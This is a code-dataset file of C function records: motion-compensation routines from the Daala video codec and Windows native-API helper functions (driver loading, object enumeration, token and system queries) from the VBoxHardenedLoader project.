{"docstring": "/*Computes the SAD of the input image against the given predictor.*/\n", "func_signal": "static int32_t od_enc_sad(od_enc_ctx *enc, const unsigned char *p,\n int pystride, int pxstride, int pli, int x, int y, int log_blk_sz)", "code": "{\n  od_state *state;\n  daala_image_plane *iplane;\n  unsigned char *src;\n  int clipx;\n  int clipy;\n  int clipw;\n  int cliph;\n  int w;\n  int h;\n  state = &enc->state;\n  iplane = &enc->curr_img->planes[pli];\n  /*Compute the block dimensions in the target image plane.*/\n  x >>= iplane->xdec;\n  y >>= iplane->ydec;\n  w = 1 << (log_blk_sz - iplane->xdec);\n  h = 1 << (log_blk_sz - iplane->ydec);\n  /*Clip the block against the active picture region.*/\n  clipx = -x;\n  if (clipx > 0) {\n    w -= clipx;\n    p += clipx*pxstride;\n    x += clipx;\n  }\n  clipy = -y;\n  if (clipy > 0) {\n    h -= clipy;\n    p += clipy*pystride;\n    y += clipy;\n  }\n  clipw = OD_PLANE_SZ(state->info.pic_width, iplane->xdec) - x;\n  w = OD_MINI(w, clipw);\n  cliph = OD_PLANE_SZ(state->info.pic_height, iplane->ydec) - y;\n  h = OD_MINI(h, cliph);\n  /*OD_LOG((OD_LOG_MOTION_ESTIMATION, OD_LOG_DEBUG,\n   \"[%i, %i]x[%i, %i]\", x, y, w, h));*/\n  /*Compute the SAD.*/\n  src = iplane->data + y*iplane->ystride + x*iplane->xstride;\n  if (w == 4 && h == 4) {\n    return (*enc->opt_vtbl.mc_compute_sad_4x4)(src, iplane->ystride,\n     p, pystride);\n  }\n  if (w == 8 && h == 8) {\n    return (*enc->opt_vtbl.mc_compute_sad_8x8)(src, iplane->ystride,\n     p, pystride);\n  }\n  if (w == 16 && h == 16) {\n    return (*enc->opt_vtbl.mc_compute_sad_16x16)(src, iplane->ystride,\n     p, pystride);\n  }\n  if (w == 32 && h == 32) {\n    return (*enc->opt_vtbl.mc_compute_sad_32x32)(src, iplane->ystride,\n     p, pystride);\n  }\n  if (w == 64 && h == 64) {\n    return (*enc->opt_vtbl.mc_compute_sad_64x64)(src, iplane->ystride,\n     p, pystride);\n  }\n  /*Default C implementation.*/\n  if (pxstride == 1) {\n    return od_mc_compute_sad8_c(src, iplane->ystride, p, pystride, w, h);\n  }\n  return od_mc_compute_sad16_c(src, iplane->ystride, p, pystride, w, h);\n}", "path": "daala/src/mcenc.c", "commit_date": "2016-01-28 00:00:00", "repo_name": "xiph/daala", "stars": 535, "license": "bsd-2-clause", "language": "c", "size": 8945}
{"docstring": "/*Fills 3 vectors with pairs of alternating 16 bit values for the 1D filter\n   chosen for the fractional position of x or y mv.*/\n", "func_signal": "OD_SIMD_INLINE void od_setup_alternating_filter_variables(\n __m128i *filter_01, __m128i *filter_23, __m128i *filter_45, int mvf)", "code": "{\n  uint32_t* f;\n  /*Load 3 pairs of 16 bit values as 32 bit values.\n    Fill each filter with these 32 values as to create a vector that\n     alternates between the 2 16 bit values.*/\n  f = (uint32_t *)(OD_SUBPEL_FILTER_SET[mvf]);\n  *filter_01 = _mm_set1_epi32(f[0]);\n  *filter_23 = _mm_set1_epi32(f[1]);\n  *filter_45 = _mm_set1_epi32(f[2]);\n}", "path": "daala/src/x86/sse2mc.c", "commit_date": "2016-01-02 00:00:00", "repo_name": "xiph/daala", "stars": 535, "license": "bsd-2-clause", "language": "c", "size": 8945}
{"docstring": "/*Returns a negative value, 0, or a positive value, depending on whether\n  -dd1/dr1 is less, equal or greater than -dd2/dr2.*/\n", "func_signal": "static int od_mv_dddr_cmp(int32_t dd1, int dr1,\n int32_t dd2, int dr2)", "code": "{\n  int64_t diff;\n  /*dr == 0 (infinite slope) is a special case.\n    We handle it as the limit of the non-infinite case.\n    We remove all vertices where it is free to do so and it helps distortion\n     immediately, and delay looking at vertices that hurt distortion but don't\n     affect rate until they are the only thing left.\n    Vertices that change neither rate nor distortion we are free to remove at\n     any time, but we choose to do so up front, before vertices that do affect\n     rate.\n    Otherwise they would get sandwiched between \"things that hurt distortion\n     and hurt rate\" and \"things that hurt distortion and don't affect rate\".\n    This gives the following total ordering (from first to last):\n                      ||                  ||         ||\n      dr == 0, dd < 0 || dr == 0, dd == 0 || dr != 0 || dr == 0, dd > 0\n                      ||                  ||         ||\n    When dr != 0, items are sorted by (-dd/dr), whereas in the\n     classes with dr == 0, they are sorted by dd directly (not negated).*/\n  if (dr1 == 0) {\n    return dr2 == 0 ? OD_SIGNI(dd1 - dd2) : (OD_SIGNI(dd1) << 1) - 1;\n  }\n  else if (dr2 == 0) return (OD_SIGNI(-dd2) << 1) + 1;\n  diff = dd2*(int64_t)dr1 - dd1*(int64_t)dr2;\n  return OD_SIGNI(diff);\n}", "path": "daala/src/mcenc.c", "commit_date": "2016-01-28 00:00:00", "repo_name": "xiph/daala", "stars": 535, "license": "bsd-2-clause", "language": "c", "size": 8945}
{"docstring": "/** Returns the boundary case indicating which motion vector range edges the\n * current motion vector is abutting.\n *\n * @param limits  The limits of valid motion vectors for the current node.\n * @param dx      The horizontal component of the motion vector.\n * @param dy      The vertical component of the motion vector.\n * @param dsz     The amount the vector is being adjusted by.\n * @param mv_res  The motion vector resolution (0 = 1/8th pel to 3 = fullpel).\n * @return        A set of flags indicating the boundary conditions, after\n *                the documentation at OD_SQUARE_SITES.\n */\n", "func_signal": "static int od_mv_est_get_boundary_case(od_mv_limits *limits,\n int dx, int dy, int dsz, int mv_res)", "code": "{\n  int mvxmin;\n  int mvxmax;\n  int mvymin;\n  int mvymax;\n  mvxmin = limits->xmin*(1 << (3 - mv_res));\n  mvxmax = limits->xmax*(1 << (3 - mv_res));\n  mvymin = limits->ymin*(1 << (3 - mv_res));\n  mvymax = limits->ymax*(1 << (3 - mv_res));\n  return (dx - dsz < mvxmin) | (dx + dsz > mvxmax) << 1 |\n   (dy - dsz < mvymin) << 2 | (dy + dsz > mvymax) << 3;\n}", "path": "daala/src/mcenc.c", "commit_date": "2016-01-28 00:00:00", "repo_name": "xiph/daala", "stars": 535, "license": "bsd-2-clause", "language": "c", "size": 8945}
{"docstring": "/*Perform normal bilinear blending.*/\n", "func_signal": "void od_mc_blend_full_split8_sse2(unsigned char *_dst,int _dystride,\n const unsigned char *_src[4],int _c,int _s,int _log_xblk_sz,int _log_yblk_sz)", "code": "{\n  static const od_mc_blend_full_split8_fixed_func\n   VTBL[OD_LOG_MVBSIZE_MAX][OD_LOG_MVBSIZE_MAX]={\n    {\n      od_mc_blend_full_split8_1x1,od_mc_blend_full_split8_1x2,\n      od_mc_blend_full_split8_1x4,od_mc_blend_full_split8_1x8,\n    },\n    {\n      od_mc_blend_full_split8_2x1,od_mc_blend_full_split8_2x2,\n      od_mc_blend_full_split8_2x4,od_mc_blend_full_split8_2x8,\n    },\n    {\n      od_mc_blend_full_split8_4x1,od_mc_blend_full_split8_4x2,\n      od_mc_blend_full_split8_4x4,od_mc_blend_full_split8_4x8,\n    },\n    {\n      od_mc_blend_full_split8_8x1,od_mc_blend_full_split8_8x2,\n      od_mc_blend_full_split8_8x4,od_mc_blend_full_split8_8x8,\n    },\n    /*These NULLs are placeholders because we do not currently call this\n       function for these sizes.\n      If you need one of them, add another OD_MC_BLEND_FULL_SPLIT8_C() line\n       above.*/\n    {\n      NULL, NULL, NULL, NULL, od_mc_blend_full_split8_16x16\n    },\n    {\n      NULL, NULL, NULL, NULL, NULL, od_mc_blend_full_split8_32x32\n    }\n  };\n  /*We pack all the image pointers in one array to save a register.*/\n  const unsigned char *drc[8];\n  memcpy(drc,_src,sizeof(*drc)*4);\n  od_mc_setup_split_ptrs(drc+4,drc,_c,_s);\n  (*VTBL[_log_xblk_sz][_log_yblk_sz])(_dst,_dystride,drc);\n#if defined(OD_CHECKASM)\n  od_mc_blend_full_split8_check(_dst,_dystride,_src,_c,_s,\n   _log_xblk_sz,_log_yblk_sz);\n  /*fprintf(stderr,\"od_mc_blend_full_split8 %ix%i check finished.\\n\",\n   1<<_log_xblk_sz,1<<_log_yblk_sz);*/\n#endif\n}", "path": "daala/src/x86/sse2mc.c", "commit_date": "2016-01-02 00:00:00", "repo_name": "xiph/daala", "stars": 535, "license": "bsd-2-clause", "language": "c", "size": 8945}
{"docstring": "/*\n* supGetImageVersionInfo\n*\n* Purpose:\n*\n* Return version numbers from version info.\n*\n*/\n", "func_signal": "BOOL supGetImageVersionInfo(\n    _In_ PWSTR lpFileName,\n    _In_ PSUP_VERINFO_NUMBERS VersionNumbers\n)", "code": "{\n    BOOL bResult = FALSE;\n    DWORD dwHandle, dwSize, dwError = ERROR_SUCCESS;\n    PVOID vinfo = NULL;\n    UINT Length;\n    VS_FIXEDFILEINFO* pFileInfo;\n\n    dwHandle = 0;\n    dwSize = GetFileVersionInfoSize(lpFileName, &dwHandle);\n    if (dwSize) {\n        vinfo = supHeapAlloc(dwSize);\n        if (vinfo) {\n            if (GetFileVersionInfoEx(0, lpFileName, 0, dwSize, vinfo)) {\n                bResult = VerQueryValue(vinfo, TEXT(\"\\\\\"), (LPVOID*)&pFileInfo, (PUINT)&Length);\n                if (bResult) {\n                    VersionNumbers->VersionMS = pFileInfo->dwFileVersionMS;\n                    VersionNumbers->VersionLS = pFileInfo->dwFileVersionLS;\n                }\n                else {\n                    dwError = GetLastError();\n                }\n            }\n            else {\n                dwError = GetLastError();\n            }\n            supHeapFree(vinfo);\n        }\n        else {\n            dwError = GetLastError();\n        }\n    }\n    else {\n        dwError = GetLastError();\n    }\n\n    SetLastError(dwError);\n    return bResult;\n}", "path": "VBoxHardenedLoader/Source/Zekamashi_v2/loader/sup.c", "commit_date": "2020-05-14 00:00:00", "repo_name": "hfiref0x/VBoxHardenedLoader", "stars": 897, "license": "bsd-2-clause", "language": "c", "size": 23953}
{"docstring": "/*\n* supQueryResourceData\n*\n* Purpose:\n*\n* Load resource by given id (win32 FindResource, SizeofResource, LockResource).\n*\n*/\n", "func_signal": "PBYTE supQueryResourceData(\n    _In_ ULONG_PTR ResourceId,\n    _In_ PVOID DllHandle,\n    _In_ PULONG DataSize\n)", "code": "{\n    NTSTATUS                    status;\n    ULONG_PTR                   IdPath[3];\n    IMAGE_RESOURCE_DATA_ENTRY* DataEntry;\n    PBYTE                       Data = NULL;\n    ULONG                       SizeOfData = 0;\n\n    if (DllHandle != NULL) {\n\n        IdPath[0] = (ULONG_PTR)RT_RCDATA; //type\n        IdPath[1] = ResourceId;           //id\n        IdPath[2] = 0;                    //lang\n\n        status = LdrFindResource_U(DllHandle, (ULONG_PTR*)&IdPath, 3, &DataEntry);\n        if (NT_SUCCESS(status)) {\n            status = LdrAccessResource(DllHandle, DataEntry, (PVOID*)&Data, &SizeOfData);\n            if (NT_SUCCESS(status)) {\n                if (DataSize) {\n                    *DataSize = SizeOfData;\n                }\n            }\n        }\n    }\n    return Data;\n}", "path": "VBoxHardenedLoader/Source/Zekamashi_v2/loader/sup.c", "commit_date": "2020-05-14 00:00:00", "repo_name": "hfiref0x/VBoxHardenedLoader", "stars": 897, "license": "bsd-2-clause", "language": "c", "size": 23953}
{"docstring": "/*\n* supLoadDriver\n*\n* Purpose:\n*\n* Install driver and load it.\n*\n* N.B.\n* SE_LOAD_DRIVER_PRIVILEGE is required to be assigned and enabled.\n*\n*/\n", "func_signal": "NTSTATUS supLoadDriver(\n    _In_ LPCWSTR DriverName,\n    _In_ LPCWSTR DriverPath,\n    _In_ BOOLEAN UnloadPreviousInstance\n)", "code": "{\n    SIZE_T keyOffset;\n    NTSTATUS status = STATUS_UNSUCCESSFUL;\n    UNICODE_STRING driverServiceName;\n\n    WCHAR szBuffer[MAX_PATH + 1];\n\n    if (DriverName == NULL)\n        return STATUS_INVALID_PARAMETER_1;\n    if (DriverPath == NULL)\n        return STATUS_INVALID_PARAMETER_2;\n\n    RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));\n\n    keyOffset = RTL_NUMBER_OF(NT_REG_PREP);\n\n    if (FAILED(StringCchPrintf(szBuffer, MAX_PATH,\n        DRIVER_REGKEY,\n        NT_REG_PREP,\n        DriverName)))\n    {\n        return STATUS_INVALID_PARAMETER_1;\n    }\n\n    status = supxCreateDriverEntry(DriverPath,\n        &szBuffer[keyOffset]);\n\n    if (!NT_SUCCESS(status))\n        return status;\n\n    RtlInitUnicodeString(&driverServiceName, szBuffer);\n    status = NtLoadDriver(&driverServiceName);\n\n    if (UnloadPreviousInstance) {\n        if ((status == STATUS_IMAGE_ALREADY_LOADED) ||\n            (status == STATUS_OBJECT_NAME_COLLISION) ||\n            (status == STATUS_OBJECT_NAME_EXISTS))\n        {\n            status = NtUnloadDriver(&driverServiceName);\n            if (NT_SUCCESS(status)) {\n                status = NtLoadDriver(&driverServiceName);\n            }\n        }\n    }\n    else {\n        if (status == STATUS_OBJECT_NAME_EXISTS)\n            status = STATUS_SUCCESS;\n    }\n\n    return status;\n}", "path": "VBoxHardenedLoader/Source/Zekamashi_v2/loader/sup.c", "commit_date": "2020-05-14 00:00:00", "repo_name": "hfiref0x/VBoxHardenedLoader", "stars": 897, "license": "bsd-2-clause", "language": "c", "size": 23953}
{"docstring": "/*\n* supGetNtOsBase\n*\n* Purpose:\n*\n* Return ntoskrnl base address.\n*\n*/\n", "func_signal": "ULONG_PTR supGetNtOsBase(\n    VOID\n)", "code": "{\n    PRTL_PROCESS_MODULES   miSpace;\n    ULONG_PTR              NtOsBase = 0;\n\n    miSpace = (PRTL_PROCESS_MODULES)supGetSystemInfo(SystemModuleInformation);\n    if (miSpace) {\n        NtOsBase = (ULONG_PTR)miSpace->Modules[0].ImageBase;\n        RtlFreeHeap(NtCurrentPeb()->ProcessHeap, 0, miSpace);\n    }\n    return NtOsBase;\n}", "path": "VBoxHardenedLoader/Source/Zekamashi_v2/loader/sup.c", "commit_date": "2020-05-14 00:00:00", "repo_name": "hfiref0x/VBoxHardenedLoader", "stars": 897, "license": "bsd-2-clause", "language": "c", "size": 23953}
{"docstring": "/*\n* supOpenDriver\n*\n* Purpose:\n*\n* Open handle for helper driver.\n*\n*/\n", "func_signal": "NTSTATUS supOpenDriver(\n    _In_ LPCWSTR DriverName,\n    _Out_ PHANDLE DeviceHandle\n)", "code": "{\n    NTSTATUS status = STATUS_UNSUCCESSFUL;\n\n    UNICODE_STRING usDeviceLink;\n    OBJECT_ATTRIBUTES obja;\n    IO_STATUS_BLOCK iost;\n\n    TCHAR szDeviceLink[MAX_PATH + 1];\n\n    // assume failure\n    if (DeviceHandle)\n        *DeviceHandle = NULL;\n    else\n        return STATUS_INVALID_PARAMETER_2;\n\n    if (DriverName) {\n\n        RtlSecureZeroMemory(szDeviceLink, sizeof(szDeviceLink));\n\n        if (FAILED(StringCchPrintf(szDeviceLink,\n            MAX_PATH,\n            TEXT(\"\\\\DosDevices\\\\%wS\"),\n            DriverName)))\n        {\n            return STATUS_INVALID_PARAMETER_1;\n        }\n\n        RtlInitUnicodeString(&usDeviceLink, szDeviceLink);\n        InitializeObjectAttributes(&obja, &usDeviceLink, OBJ_CASE_INSENSITIVE, NULL, NULL);\n\n        status = NtCreateFile(DeviceHandle,\n            GENERIC_READ | GENERIC_WRITE,\n            &obja,\n            &iost,\n            NULL,\n            0,\n            0,\n            FILE_OPEN,\n            0,\n            NULL,\n            0);\n\n    }\n    else {\n        status = STATUS_INVALID_PARAMETER_1;\n    }\n\n    return status;\n}", "path": "VBoxHardenedLoader/Source/Zekamashi_v2/loader/sup.c", "commit_date": "2020-05-14 00:00:00", "repo_name": "hfiref0x/VBoxHardenedLoader", "stars": 897, "license": "bsd-2-clause", "language": "c", "size": 23953}
{"docstring": "/*\n* supExpandEnvironmentStrings\n*\n* Purpose:\n*\n* Reimplemented ExpandEnvironmentStrings.\n*\n*/\n", "func_signal": "DWORD supExpandEnvironmentStrings(\n    _In_ LPCWSTR lpSrc,\n    _Out_writes_to_opt_(nSize, return) LPWSTR lpDst,\n    _In_ DWORD nSize\n)", "code": "{\n    NTSTATUS Status;\n    SIZE_T SrcLength = 0, ReturnLength = 0, DstLength = (SIZE_T)nSize;\n\n    if (lpSrc) {\n        SrcLength = _strlen(lpSrc);\n    }\n\n    Status = RtlExpandEnvironmentStrings(\n        NULL,\n        (PWSTR)lpSrc,\n        SrcLength,\n        (PWSTR)lpDst,\n        DstLength,\n        &ReturnLength);\n\n    if ((NT_SUCCESS(Status)) || (Status == STATUS_BUFFER_TOO_SMALL)) {\n\n        if (ReturnLength <= MAXDWORD32)\n            return (DWORD)ReturnLength;\n\n        Status = STATUS_UNSUCCESSFUL;\n    }\n    RtlSetLastWin32Error(RtlNtStatusToDosError(Status));\n    return 0;\n}", "path": "VBoxHardenedLoader/Source/Zekamashi_v2/loader/sup.c", "commit_date": "2020-05-14 00:00:00", "repo_name": "hfiref0x/VBoxHardenedLoader", "stars": 897, "license": "bsd-2-clause", "language": "c", "size": 23953}
{"docstring": "/*\n* supUnloadDriver\n*\n* Purpose:\n*\n* Call driver unload and remove corresponding registry key.\n*\n* N.B.\n* SE_LOAD_DRIVER_PRIVILEGE is required to be assigned and enabled.\n*\n*/\n", "func_signal": "NTSTATUS supUnloadDriver(\n    _In_ LPCWSTR DriverName,\n    _In_ BOOLEAN fRemove\n)", "code": "{\n    NTSTATUS status;\n    SIZE_T keyOffset;\n    UNICODE_STRING driverServiceName;\n\n    WCHAR szBuffer[MAX_PATH + 1];\n\n    RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));\n\n    if (FAILED(StringCchPrintf(szBuffer, MAX_PATH,\n        DRIVER_REGKEY,\n        NT_REG_PREP,\n        DriverName)))\n    {\n        return STATUS_INVALID_PARAMETER_1;\n    }\n\n    keyOffset = RTL_NUMBER_OF(NT_REG_PREP);\n\n    status = supxCreateDriverEntry(NULL,\n        &szBuffer[keyOffset]);\n\n    if (!NT_SUCCESS(status))\n        return status;\n\n    RtlInitUnicodeString(&driverServiceName, szBuffer);\n    status = NtUnloadDriver(&driverServiceName);\n\n    if (NT_SUCCESS(status)) {\n        if (fRemove)\n            supRegDeleteKeyRecursive(HKEY_LOCAL_MACHINE, &szBuffer[keyOffset]);\n    }\n\n    return status;\n}", "path": "VBoxHardenedLoader/Source/Zekamashi_v2/loader/sup.c", "commit_date": "2020-05-14 00:00:00", "repo_name": "hfiref0x/VBoxHardenedLoader", "stars": 897, "license": "bsd-2-clause", "language": "c", "size": 23953}
{"docstring": "/*\n* supGetCommandLineOption\n*\n* Purpose:\n*\n* Parse command line options.\n*\n*/\n", "func_signal": "BOOL supGetCommandLineOption(\n    _In_ LPCTSTR OptionName,\n    _In_ BOOL IsParametric,\n    _Inout_opt_ LPTSTR OptionValue,\n    _In_ ULONG ValueSize\n)", "code": "{\n    LPTSTR\tcmdline = GetCommandLine();\n    TCHAR   Param[MAX_PATH + 1];\n    ULONG   rlen;\n    int\t\ti = 0;\n\n    RtlSecureZeroMemory(Param, sizeof(Param));\n    while (GetCommandLineParam(cmdline, i, Param, MAX_PATH, &rlen))\n    {\n        if (rlen == 0)\n            break;\n\n        if (_strcmp(Param, OptionName) == 0)\n        {\n            if (IsParametric)\n                return GetCommandLineParam(cmdline, i + 1, OptionValue, ValueSize, &rlen);\n\n            return TRUE;\n        }\n        ++i;\n    }\n\n    return 0;\n}", "path": "VBoxHardenedLoader/Source/Zekamashi_v2/loader/sup.c", "commit_date": "2020-05-14 00:00:00", "repo_name": "hfiref0x/VBoxHardenedLoader", "stars": 897, "license": "bsd-2-clause", "language": "c", "size": 23953}
{"docstring": "/*\n* supRegDeleteKeyRecursive\n*\n* Purpose:\n*\n* Delete key and all it subkeys/values.\n*\n* Remark:\n*\n* SubKey should not be longer than 260 chars.\n*\n*/\n", "func_signal": "BOOL supRegDeleteKeyRecursive(\n    _In_ HKEY hKeyRoot,\n    _In_ LPWSTR lpSubKey)", "code": "{\n    WCHAR szKeyName[MAX_PATH * 2];\n    RtlSecureZeroMemory(szKeyName, sizeof(szKeyName));\n    _strncpy(szKeyName, MAX_PATH * 2, lpSubKey, MAX_PATH);\n    return supxDeleteKeyRecursive(hKeyRoot, szKeyName);\n}", "path": "VBoxHardenedLoader/Source/Zekamashi_v2/loader/sup.c", "commit_date": "2020-05-14 00:00:00", "repo_name": "hfiref0x/VBoxHardenedLoader", "stars": 897, "license": "bsd-2-clause", "language": "c", "size": 23953}
{"docstring": "/*\n* supGetTokenInfo\n*\n* Purpose:\n*\n* Returns buffer with token information by given TokenInformationClass.\n*\n* Returned buffer must be freed with supHeapFree after usage.\n*\n*/\n", "func_signal": "PVOID supGetTokenInfo(\n    _In_ HANDLE TokenHandle,\n    _In_ TOKEN_INFORMATION_CLASS TokenInformationClass,\n    _Out_opt_ PULONG ReturnLength\n)", "code": "{\n    PVOID Buffer = NULL;\n    ULONG returnLength = 0;\n\n    if (ReturnLength)\n        *ReturnLength = 0;\n\n    NtQueryInformationToken(TokenHandle,\n        TokenInformationClass,\n        NULL,\n        0,\n        &returnLength);\n\n    Buffer = supHeapAlloc((SIZE_T)returnLength);\n    if (Buffer) {\n\n        if (NT_SUCCESS(NtQueryInformationToken(TokenHandle,\n            TokenInformationClass,\n            Buffer,\n            returnLength,\n            &returnLength)))\n        {\n            if (ReturnLength)\n                *ReturnLength = returnLength;\n            return Buffer;\n        }\n        else {\n            supHeapFree(Buffer);\n            return NULL;\n        }\n    }\n\n    return Buffer;\n}", "path": "VBoxHardenedLoader/Source/Zekamashi_v2/loader/sup.c", "commit_date": "2020-05-14 00:00:00", "repo_name": "hfiref0x/VBoxHardenedLoader", "stars": 897, "license": "bsd-2-clause", "language": "c", "size": 23953}
{"docstring": "/*\n* supGetSystemInfo\n*\n* Purpose:\n*\n* Wrapper for NtQuerySystemInformation.\n*\n*/\n", "func_signal": "PVOID supGetSystemInfo(\n    _In_ SYSTEM_INFORMATION_CLASS InfoClass\n)", "code": "{\n    INT         c = 0;\n    PVOID       Buffer = NULL;\n    ULONG\t\tSize = 0x1000;\n    NTSTATUS    status;\n    ULONG       memIO;\n\n    do {\n        Buffer = supHeapAlloc((SIZE_T)Size);\n        if (Buffer != NULL) {\n            status = NtQuerySystemInformation(InfoClass, Buffer, Size, &memIO);\n        }\n        else {\n            return NULL;\n        }\n        if (status == STATUS_INFO_LENGTH_MISMATCH) {\n            supHeapFree(Buffer);\n            Buffer = NULL;\n            Size *= 2;\n            c++;\n            if (c > 100) {\n                status = STATUS_SECRET_TOO_LONG;\n                break;\n            }\n        }\n    } while (status == STATUS_INFO_LENGTH_MISMATCH);\n\n    if (NT_SUCCESS(status)) {\n        return Buffer;\n    }\n\n    if (Buffer) {\n        supHeapFree(Buffer);\n    }\n    return NULL;\n}", "path": "VBoxHardenedLoader/Source/Zekamashi_v2/loader/sup.c", "commit_date": "2020-05-14 00:00:00", "repo_name": "hfiref0x/VBoxHardenedLoader", "stars": 897, "license": "bsd-2-clause", "language": "c", "size": 23953}
{"docstring": "/*\n* supEnumSystemObjects\n*\n* Purpose:\n*\n* Lookup object by name in given directory.\n*\n*/\n", "func_signal": "NTSTATUS NTAPI supEnumSystemObjects(\n    _In_opt_ LPWSTR pwszRootDirectory,\n    _In_opt_ HANDLE hRootDirectory,\n    _In_ PENUMOBJECTSCALLBACK CallbackProc,\n    _In_opt_ PVOID CallbackParam\n)", "code": "{\n    ULONG               ctx, rlen;\n    HANDLE              hDirectory = NULL;\n    NTSTATUS            status;\n    NTSTATUS            CallbackStatus;\n    OBJECT_ATTRIBUTES   attr;\n    UNICODE_STRING      sname;\n\n    POBJECT_DIRECTORY_INFORMATION    objinf;\n\n    if (CallbackProc == NULL) {\n        return STATUS_INVALID_PARAMETER_4;\n    }\n\n    status = STATUS_UNSUCCESSFUL;\n\n    __try {\n\n        // We can use root directory.\n        if (pwszRootDirectory != NULL) {\n            RtlSecureZeroMemory(&sname, sizeof(sname));\n            RtlInitUnicodeString(&sname, pwszRootDirectory);\n            InitializeObjectAttributes(&attr, &sname, OBJ_CASE_INSENSITIVE, NULL, NULL);\n            status = NtOpenDirectoryObject(&hDirectory, DIRECTORY_QUERY, &attr);\n            if (!NT_SUCCESS(status)) {\n                return status;\n            }\n        }\n        else {\n            if (hRootDirectory == NULL) {\n                return STATUS_INVALID_PARAMETER_2;\n            }\n            hDirectory = hRootDirectory;\n        }\n\n        // Enumerate objects in directory.\n        ctx = 0;\n        do {\n\n            rlen = 0;\n            status = NtQueryDirectoryObject(hDirectory, NULL, 0, TRUE, FALSE, &ctx, &rlen);\n            if (status != STATUS_BUFFER_TOO_SMALL)\n                break;\n\n            objinf = (POBJECT_DIRECTORY_INFORMATION)supHeapAlloc(rlen);\n            if (objinf == NULL)\n                break;\n\n            status = NtQueryDirectoryObject(hDirectory, objinf, rlen, TRUE, FALSE, &ctx, &rlen);\n            if (!NT_SUCCESS(status)) {\n                supHeapFree(objinf);\n                break;\n            }\n\n            CallbackStatus = CallbackProc(objinf, CallbackParam);\n\n            supHeapFree(objinf);\n\n            if (NT_SUCCESS(CallbackStatus)) {\n                status = STATUS_SUCCESS;\n                break;\n            }\n\n        } while (TRUE);\n\n        if (hDirectory != NULL) {\n            NtClose(hDirectory);\n        }\n\n    }\n    __except (EXCEPTION_EXECUTE_HANDLER) {\n        status = STATUS_ACCESS_VIOLATION;\n    }\n\n    return status;\n}", "path": "VBoxHardenedLoader/Source/Zekamashi_v2/loader/sup.c", "commit_date": "2020-05-14 00:00:00", "repo_name": "hfiref0x/VBoxHardenedLoader", "stars": 897, "license": "bsd-2-clause", "language": "c", "size": 23953}
{"docstring": "/*\n* supPurgeSystemCache\n*\n* Purpose:\n*\n* Flush file cache and memory standby list.\n*\n*/\n", "func_signal": "VOID supPurgeSystemCache(\n    VOID\n)", "code": "{\n    SYSTEM_FILECACHE_INFORMATION sfc;\n    SYSTEM_MEMORY_LIST_COMMAND smlc;\n\n    //flush file system cache\n    if (NT_SUCCESS(supEnablePrivilege(SE_INCREASE_QUOTA_PRIVILEGE, TRUE))) {\n        RtlSecureZeroMemory(&sfc, sizeof(SYSTEM_FILECACHE_INFORMATION));\n        sfc.MaximumWorkingSet = (SIZE_T)-1;\n        sfc.MinimumWorkingSet = (SIZE_T)-1;\n        NtSetSystemInformation(SystemFileCacheInformation, &sfc, sizeof(sfc));\n    }\n\n    //flush standby list\n    if (NT_SUCCESS(supEnablePrivilege(SE_PROF_SINGLE_PROCESS_PRIVILEGE, TRUE))) {\n        smlc = MemoryPurgeStandbyList;\n        NtSetSystemInformation(SystemMemoryListInformation, &smlc, sizeof(smlc));\n    }\n}", "path": "VBoxHardenedLoader/Source/Zekamashi_v2/loader/sup.c", "commit_date": "2020-05-14 00:00:00", "repo_name": "hfiref0x/VBoxHardenedLoader", "stars": 897, "license": "bsd-2-clause", "language": "c", "size": 23953}
{"docstring": "/*\n* supDetectObjectCallback\n*\n* Purpose:\n*\n* Comparer callback routine used in objects enumeration.\n*\n*/\n", "func_signal": "NTSTATUS NTAPI supDetectObjectCallback(\n    _In_ POBJECT_DIRECTORY_INFORMATION Entry,\n    _In_ PVOID CallbackParam\n)", "code": "{\n    POBJSCANPARAM Param = (POBJSCANPARAM)CallbackParam;\n\n    if (Entry == NULL) {\n        return STATUS_INVALID_PARAMETER_1;\n    }\n\n    if (CallbackParam == NULL) {\n        return STATUS_INVALID_PARAMETER_2;\n    }\n\n    if (Param->Buffer == NULL || Param->BufferSize == 0) {\n        return STATUS_MEMORY_NOT_ALLOCATED;\n    }\n\n    if (Entry->Name.Buffer) {\n        if (_strcmpi_w(Entry->Name.Buffer, Param->Buffer) == 0) {\n            return STATUS_SUCCESS;\n        }\n    }\n    return STATUS_UNSUCCESSFUL;\n}", "path": "VBoxHardenedLoader/Source/Zekamashi_v2/loader/sup.c", "commit_date": "2020-05-14 00:00:00", "repo_name": "hfiref0x/VBoxHardenedLoader", "stars": 897, "license": "bsd-2-clause", "language": "c", "size": 23953}
{"docstring": "/*\n* supQueryObjectFromHandle\n*\n* Purpose:\n*\n* Return object kernel address from handle in current process handle table.\n*\n*/\n", "func_signal": "BOOL supQueryObjectFromHandle(\n    _In_ HANDLE hOject,\n    _Out_ ULONG_PTR* Address\n)", "code": "{\n    BOOL   bFound = FALSE;\n    ULONG  i;\n    DWORD  CurrentProcessId = GetCurrentProcessId();\n\n    PSYSTEM_HANDLE_INFORMATION_EX pHandles;\n\n    if (Address)\n        *Address = 0;\n    else\n        return FALSE;\n\n    pHandles = (PSYSTEM_HANDLE_INFORMATION_EX)supGetSystemInfo(SystemExtendedHandleInformation);\n    if (pHandles) {\n        for (i = 0; i < pHandles->NumberOfHandles; i++) {\n            if (pHandles->Handles[i].UniqueProcessId == CurrentProcessId) {\n                if (pHandles->Handles[i].HandleValue == (USHORT)(ULONG_PTR)hOject) {\n                    *Address = (ULONG_PTR)pHandles->Handles[i].Object;\n                    bFound = TRUE;\n                    break;\n                }\n            }\n        }\n        supHeapFree(pHandles);\n    }\n    return bFound;\n}", "path": "VBoxHardenedLoader/Source/Zekamashi_v2/loader/sup.c", "commit_date": "2020-05-14 00:00:00", "repo_name": "hfiref0x/VBoxHardenedLoader", "stars": 897, "license": "bsd-2-clause", "language": "c", "size": 23953}
